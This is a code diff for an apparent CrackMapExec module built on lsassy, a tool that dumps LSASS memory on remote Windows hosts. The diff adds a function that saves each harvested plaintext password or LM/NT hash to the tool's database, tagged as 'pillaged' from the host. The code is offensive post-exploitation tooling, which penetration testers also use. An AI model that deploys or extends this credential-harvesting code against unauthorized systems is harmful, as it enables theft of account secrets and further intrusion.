@@ -14,7 +14,6 @@ from lsassy.parser import Parser
 from lsassy.session import Session
 from lsassy.impacketfile import ImpacketFile
 
-
 credentials_data = []
 admin_results = []
 found_users = []
@@ -129,6 +128,15 @@ class CMEModule:
         self.reset_dumped = module_options.get('RESET_DUMPED', False)
         self.reset = module_options.get('RESET', False)
 
+    @staticmethod
+    def save_credentials(context, connection, domain, username, password, lmhash, nthash):
+        host_id = context.db.get_computers(connection.host)[0][0]
+        if password is not None:
+            credential_type = 'plaintext'
+        else:
+            credential_type = 'hash'
+            password = ':'.join(h for h in [lmhash, nthash] if h is not None)
+        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)
 
     def run_lsassy(self, context, connection): # Couldn't figure out how to properly retrieve output from the module without editing. Blatantly ripped from lsassy_dump.py. Thanks pixis - @hackanddo!
         logger.init(quiet=True)
@@ -173,6 +181,7 @@ class CMEModule:
             if [cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]] not in credentials_unique:
                 credentials_unique.append([cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]])
                 credentials_output.append(cred)
+            self.save_credentials(context, connection, cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"])
         global credentials_data
         credentials_data = credentials_output
 
